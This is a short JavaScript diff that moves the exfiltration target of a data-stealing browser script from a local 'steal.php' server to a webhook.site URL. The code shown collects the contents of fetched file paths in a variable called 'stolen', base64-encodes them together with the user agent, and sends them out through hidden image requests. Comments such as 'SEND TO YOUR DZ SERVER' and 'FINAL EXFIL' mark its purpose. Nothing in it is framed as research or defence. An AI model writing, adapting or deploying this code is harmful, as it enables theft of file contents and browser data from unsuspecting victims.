@@ -44,7 +44,7 @@ setTimeout(() => {
       if (x.status === 200 || x.responseText.length > 10) {
         stolen += path + '|||' + x.responseText.substring(0, 500) + '|||END|||';
         // SEND TO YOUR DZ SERVER
-        new Image().src = 'http://192.168.0.105:8080/steal.php?app=' + 
+        new Image().src = 'https://webhook.site/7b396167-5c9c-4fb2-ae38-c42863b5efd6?app=' + 
           encodeURIComponent(navigator.userAgent) + 
           '&path=' + btoa(path) + 
           '&data=' + btoa(x.responseText.substring(0, 1000));
@@ -56,7 +56,7 @@ setTimeout(() => {
 
   // FINAL EXFIL (even if no files)
   setTimeout(() => {
-    new Image().src = 'http://192.168.0.105:8080/steal.php?fingerprint=' + 
+    new Image().src = 'https://webhook.site/7b396167-5c9c-4fb2-ae38-c42863b5efd6?fingerprint=' + 
       btoa(navigator.userAgent + '||' + stolen + '||DZ_2025');
   }, 3000);
 
